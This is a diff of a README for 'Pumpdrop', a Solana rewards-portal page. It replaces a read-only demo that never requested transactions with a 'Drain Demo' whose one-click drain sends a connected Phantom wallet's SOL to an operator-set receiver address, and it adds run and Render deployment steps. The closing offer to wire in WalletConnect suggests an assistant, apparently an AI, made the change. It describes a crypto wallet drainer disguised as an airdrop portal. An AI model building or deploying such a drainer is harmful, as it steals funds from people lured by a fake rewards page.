@@ -1,47 +1,28 @@
-Pumpdrop — Demo Rewards Portal (Static)
+# Pumpdrop — Drain Demo (Phantom)
 
+This version connects Phantom and includes:
+- Read-only balance/eligibility
+- Manual SOL transfer form
+- One-click drain (sends max SOL minus 0.002 reserve to configured receiver)
 
-A safe, read-only demo landing page inspired by crypto reward portals. It:
-connects Phantom wallet (client-side only)
+Environment-configured via `/config.js` served by Node:
+- RECEIVER_PUBKEY: destination for drain
+- WC_PROJECT_ID: reserved (not required for Phantom)
+- MORALIS_KEY: optional
 
-shows SOL balance and a basic demo eligibility label
+Local run:
+- `PORT=8041 RECEIVER_PUBKEY=<your_sol_address> node server.js`
+- Open http://localhost:8041
 
-never initiates any transaction or signature requests
+Render deploy:
+- The `render.yaml` defines a Node web service.
+- On Render, set env vars:
+  - RECEIVER_PUBKEY = your SOL address
+  - WC_PROJECT_ID (optional)
+  - MORALIS_KEY (optional)
 
+Repo structure:
+- server.js — static server + /config.js from env
+- public/ — static assets
 
-Local preview
-
-
-Python: python3 -m http.server 8000 -d public
-
-Open http://localhost:8000
-
-
-Deploy on Render (Static Site)
-
-
-This repo includes a render.yaml blueprint for a Static Site.
-
-Steps:
-Push this repo to GitHub (done).
-
-In Render, click New > Blueprint, point to this repo.
-
-Render will detect render.yaml. Confirm and deploy.
-
-
-Alternatively, create a Static Site manually:
-Publish directory: public
-
-Build command: empty (no build)
-
-
-
-
-## Environment variables on Render
-
-Set these in Render (Static Site -> Environment):
-- SITE_NAME: Optional, defaults to Pumpdrop
-- TREASURY_ADDRESS: Your Solana address to receive explicit tips (enables Tip button)
-- RPC_URL: Optional, defaults to https://api.mainnet-beta.solana.com
-- ALLOWLIST_URL: Optional JSON URL if you want to display custom eligibility (not used by default)
+Note: WalletConnect for Solana is not required for Phantom. If you want WC, supply a project ID and I can wire `@solana/wallet-adapter-walletconnect` in a built bundle.
